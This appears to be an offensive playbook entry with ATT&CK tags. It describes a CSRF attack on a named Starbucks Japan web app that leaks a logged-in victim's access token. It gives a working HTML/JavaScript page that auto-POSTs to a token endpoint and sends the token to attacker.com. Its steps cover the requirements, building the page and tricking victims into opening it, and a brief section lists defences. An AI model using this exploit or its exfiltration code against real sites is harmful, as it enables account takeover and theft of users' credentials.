---
id: proc-uuid-002
tags:
  - csrf
  - token-leak
  - exploitation
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.536Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft HTML for CSRF Access Token Leakage

## Summary

This procedure crafts a malicious HTML file to exploit CSRF in Starbucks' webapp.starbucks.co.jp, tricking an authenticated user into leaking their access token via a cross-site request in a non-Chrome browser.

## Description

The attack leverages the vulnerable endpoint by auto-submitting a form that triggers a response containing the access token. Due to automatic cookie inclusion, the request authenticates as the victim. The token is captured in the response and exfiltrated to an attacker-controlled endpoint, enabling unauthorized access to the account.

## Requirements

1. Identified vulnerable endpoint from discovery
2. Attacker-controlled server for exfiltration (e.g., webhook.site or own domain)
3. Victim authenticated in target app
4. Non-Chrome browser for execution

## Defense

Defensive measures and detection strategies:

- Enforce SameSite=Strict on cookies
- Use CSRF tokens for sensitive endpoints
- Log and alert on token access from unusual referers

## Objectives

1. Trigger cross-site request to leak token
2. Exfiltrate token to attacker
3. Enable follow-on unauthorized actions

## Instructions

### Step 1: Identify Target Endpoint

**Context**: Determine the exact URL that returns the token in response.

From discovery, note the authentication endpoint (e.g., https://webapp.starbucks.co.jp/api/get-token).

### Step 2: Craft the Malicious HTML

**Context**: Build an HTML file that auto-submits a request and captures the response.

Create the file with JavaScript to send the request and log/exfil the response. Use XMLHttpRequest or fetch to POST to the endpoint and send the token to attacker's URL.

Example HTML:

```html
<!DOCTYPE html>
<html>
<body>
<script>
function leakToken() {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://webapp.starbucks.co.jp/api/get-token', true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var token = JSON.parse(xhr.responseText).access_token;
      var exfil = new XMLHttpRequest();
      exfil.open('GET', 'https://attacker.com/leak?token=' + encodeURIComponent(token), true);
      exfil.send();
    }
  };
  xhr.send();
}
leakToken();
</script>
</body>
</html>
```

**Expected Output**: Token exfiltrated to attacker's server.

### Step 3: Deliver and Execute

**Context**: Trick victim into opening the file.

Host the HTML or send as attachment/email. Ensure opened in vulnerable browser while authenticated.

**Expected Output**: Request in victim's browser network tab showing token response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[token-leak]]
